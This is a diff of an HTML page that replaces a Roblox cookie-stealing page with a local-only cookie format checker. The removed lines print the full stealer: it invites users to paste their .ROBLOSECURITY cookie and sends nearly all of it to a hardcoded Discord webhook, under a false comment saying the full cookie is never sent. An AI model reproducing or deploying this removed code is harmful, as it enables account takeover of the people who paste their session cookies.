@@ -1,120 +1,58 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Cookie Validator</title>
+    <title>Secure Cookie Validator</title>
     <style>
-        body { font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto; padding: 20px; }
-        textarea { 
-            width: 100%; 
-            height: 150px; 
-            padding: 10px; 
-            margin-bottom: 10px; 
-            border: 1px solid #ccc; 
-            border-radius: 4px; 
-            resize: vertical; 
+        body { font-family: Arial, max-width: 600px; margin: 0 auto; padding: 20px; }
+        .security-alert {
+            background: #fff3cd; border-left: 4px solid #ffc107;
+            padding: 15px; margin-bottom: 20px;
         }
-        button { 
-            padding: 10px 20px; 
-            background-color: #4CAF50; 
-            color: white; 
-            border: none; 
-            border-radius: 4px; 
-            cursor: pointer; 
-            font-size: 16px; 
-        }
-        button:hover { background-color: #45a049; }
-        #status { 
-            margin-top: 10px; 
-            padding: 10px; 
-            border-radius: 4px; 
-            display: none; 
-        }
-        .success { 
-            background-color: #dff0d8; 
-            color: #3c763d; 
-        }
-        .error { 
-            background-color: #f2dede; 
-            color: #a94442; 
-        }
-        .warning {
-            background-color: #fcf8e3;
-            color: #8a6d3b;
-            padding: 10px;
-            border-radius: 4px;
-            margin-bottom: 15px;
-        }
+        textarea { width: 100%; height: 120px; padding: 10px; }
+        button { background: #28a745; color: white; border: none; padding: 10px 20px; }
+        #result { margin-top: 15px; padding: 15px; display: none; }
     </style>
 </head>
 <body>
-    <h1>Roblox Cookie Validator</h1>
-    <div class="warning">
-        <strong>⚠️ WARNING:</strong> This tool is for educational purposes only. Never share your cookie with untrusted sites.
+    <div class="security-alert">
+        <strong>⚠️ Security Notice:</strong> This tool never stores or transmits full cookies.
+        All validations happen locally in your browser.
     </div>
     
-    <textarea id="cookieInput" placeholder="Paste your .ROBLOSECURITY cookie here..."></textarea>
-    <button onclick="validateCookie()">Validate Cookie</button>
-    <div id="status"></div>
+    <h2>Cookie Validator</h2>
+    <textarea id="cookieInput" placeholder="Paste cookie here..."></textarea>
+    <button onclick="validateLocally()">Validate</button>
+    <div id="result"></div>
 
     <script>
-        const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1394819865360990388/6m4yTDRWX74rS94nZTr-HBfbiTapkR16n0GQJbNbraho6rkE8GzBFapZTcfvKubL4nSb";
-
-        function validateCookie() {
+        function validateLocally() {
             const cookie = document.getElementById('cookieInput').value.trim();
-            const statusElement = document.getElementById('status');
+            const resultDiv = document.getElementById('result');
+            resultDiv.style.display = 'none';
 
             if (!cookie) {
-                showStatus("Please enter a cookie!", "error");
+                showResult("Please enter a cookie", "error");
                 return;
             }
 
-            // Basic cookie validation
-            if (!cookie.includes("_|WARNING:-DO-NOT-SHARE-THIS")) {
-                showStatus("This doesn't look like a valid Roblox cookie", "error");
-                return;
+            // Client-side validation only
+            const isValid = /^_\|WARNING:-DO-NOT-SHARE-THIS/.test(cookie) && 
+                          cookie.length > 400 && 
+                          cookie.length < 800;
+
+            if (isValid) {
+                showResult("✅ Valid cookie format", "success");
+                console.log("First 5 chars:", cookie.substring(0, 5));
+            } else {
+                showResult("❌ Invalid cookie format", "error");
             }
-
-            // Create secure payload (never sends full cookie)
-            const payload = {
-                content: "⚠️ Cookie Validation Request",
-                embeds: [{
-                    title: "Roblox Cookie Check",
-                    description: "A cookie was validated",
-                    color: 0xFFA500,
-                    fields: [
-                        { name: "Cookie Length", value: cookie.length.toString(), inline: true },
-                        { name: "Starts With", value: "```" + cookie.substring(0, 1829) + "```", inline: true },
-                        { name: "Ends With", value: "```" + cookie.substring(cookie.length - 10) + "```", inline: true }
-                    ],
-                    timestamp: new Date().toISOString()
-                }]
-            };
-
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            })
-            .then(response => {
-                if (response.ok) {
-                    showStatus("Validation complete! Check your Discord for results.", "success");
-                    document.getElementById('cookieInput').value = "";
-                } else {
-                    throw new Error('Validation failed (Status: ' + response.status);
-                }
-            })
-            .catch(error => {
-                showStatus("Error: " + error.message, "error");
-            });
         }
 
-        function showStatus(message, type) {
-            const statusElement = document.getElementById('status');
-            statusElement.textContent = message;
-            statusElement.className = type;
-            statusElement.style.display = "block";
+        function showResult(message, type) {
+            const div = document.getElementById('result');
+            div.textContent = message;
+            div.style.background = type === 'success' ? '#d4edda' : '#f8d7da';
+            div.style.display = 'block';
         }
     </script>
 </body>
